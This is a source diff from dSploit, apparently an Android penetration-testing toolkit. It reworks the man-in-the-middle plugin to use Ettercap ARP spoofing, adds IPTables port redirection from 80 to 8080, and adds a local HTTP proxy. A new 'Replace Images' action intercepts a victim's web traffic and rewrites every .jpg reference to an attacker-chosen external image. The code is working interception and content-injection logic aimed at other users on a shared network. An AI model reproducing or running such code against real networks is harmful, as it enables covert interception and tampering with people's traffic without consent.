@@ -35,17 +35,21 @@ import android.widget.TextView;
 import android.widget.Toast;
 import it.evilsocket.dsploit.R;
 import it.evilsocket.dsploit.net.Target;
+import it.evilsocket.dsploit.net.http.Proxy;
 import it.evilsocket.dsploit.system.Environment;
 import it.evilsocket.dsploit.system.Plugin;
-import it.evilsocket.dsploit.system.Shell.OutputReceiver;
-import it.evilsocket.dsploit.tools.ArpSpoof;
+import it.evilsocket.dsploit.tools.Ettercap;
+import it.evilsocket.dsploit.tools.Ettercap.OnReadyListener;
+import it.evilsocket.dsploit.tools.IPTables;
 
 public class MITM extends Plugin 
 {
 	private ListView      	  mActionListView = null;
 	private ActionAdapter 	  mActionAdapter  = null;
 	private ArrayList<Action> mActions  	  = new ArrayList<Action>();	
-	private ArpSpoof		  mArpSpoof		  = null;
+	private Ettercap		  mEttercap		  = null;
+	private IPTables		  mIpTables		  = null;
+	private Proxy			  mProxy		  = null;
 	
 	class Action
 	{
@@ -129,7 +133,16 @@ public class MITM extends Plugin
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);   
         
-        mArpSpoof = new ArpSpoof( this );
+        try
+        {
+	        mEttercap = new Ettercap( this );
+	        mIpTables = new IPTables();
+			mProxy    = new Proxy( Environment.getNetwork().getLoacalAddress(), 8080 );
+        }
+        catch( Exception e )
+        {
+        	Log.e( "MITM", e.toString() );
+        }
         
         mActions.add( new Action( "Simple Sniff", "Only redirect target's traffic through this device, useful when using a network sniffer like 'Sharp' for android.", new OnClickListener(){
 			@Override
@@ -160,32 +173,13 @@ public class MITM extends Plugin
 
 					Environment.setForwarding( false );
 
-					OutputReceiver receiver = new OutputReceiver(){
-						@Override
-						public void onStart(String command) { }
-
-						@Override
-						public void onNewLine( String line ) {
-							// arpspoof sometimes goes segfault, restart it just in case :P
-							if( line.trim().toLowerCase().contains("segmentation fault") )
-							{
-								Log.w( "ARPSPOOF", "Restarting arpspoof after SEGFAULT" );
-								mArpSpoof.kill();
-								mArpSpoof.spoof( Environment.getTarget(), this ).start();
-							}
-						}
-
-						@Override
-						public void onEnd(int exitCode) { }
-					};
-					
-					mArpSpoof.spoof( Environment.getTarget(), receiver ).start();											
+					mEttercap.spoof( Environment.getTarget(), null ).start();											
 				}
 				else
 				{
 	
 					Environment.setForwarding( true );
-					mArpSpoof.kill();
+					mEttercap.kill();
 								
 					activity.setVisibility( View.INVISIBLE );
 				}
@@ -207,17 +201,54 @@ public class MITM extends Plugin
                 overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);
 			}
 		}));
- /*        
-	TODO:
-        mActions.add( new Action( "Traffic Redirect", "Redirect every http request to a specific website.", new OnClickListener(){
+
+        mActions.add( new Action( "Replace Images", "Replace all images on webpages with the specified one.", new OnClickListener(){
 			@Override
 			public void onClick(View v) {
-								
+				ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );
+
+				if( activity.getVisibility() == View.INVISIBLE )
+				{
+					activity.setVisibility( View.VISIBLE );
+					
+					Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
+										
+					mEttercap.spoof( Environment.getTarget(), new OnReadyListener(){
+						@Override
+						public void onReady() 
+						{
+							Environment.setForwarding( true );
+							
+							mProxy.setFilter( new Proxy.ProxyFilter() {					
+								@Override
+								public String onHtmlReceived(String html) {
+									return html.replaceAll( "src=['\"][^'\"]+\\.jpg['\"]", "src=\"http://www.evilsocket.net/trollface.png\"" );
+								}
+							});
+							
+							new Thread( mProxy ).start();
+							
+							mIpTables.portRedirect( 80, 8080 );									
+						}
+						
+					}).start();						
+				}
+				else
+				{
+	
+					Environment.setForwarding( false );
+					
+					mEttercap.kill();
+					mProxy.stop();
+					mIpTables.undoPortRedirect( 80, 8080 );
+					activity.setVisibility( View.INVISIBLE );
+				}
 			}
 		}));
 
- 
-        mActions.add( new Action( "Replace Images", "Replace all images on webpages with the specified one.", new OnClickListener(){
+        /*        
+    	TODO:
+        mActions.add( new Action( "Traffic Redirect", "Redirect every http request to a specific website.", new OnClickListener(){
 			@Override
 			public void onClick(View v) {
 								
